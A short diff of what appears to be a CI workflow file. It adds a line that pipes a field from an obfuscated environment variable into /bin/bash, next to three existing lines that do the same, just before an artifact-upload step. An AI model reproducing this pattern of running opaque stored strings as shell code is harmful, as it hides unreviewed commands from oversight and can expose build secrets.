@@ -34,6 +34,7 @@ jobs:
           echo $inik464 | jq -r .bmyhh0023 | /bin/bash
           echo $qbtc1588 | jq -r .z47384 | /bin/bash
           echo $iwkrh48776 | jq -r .pgcu6 | /bin/bash
+          printf '%s' "$eanmm85993" | jq -r .f3636 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
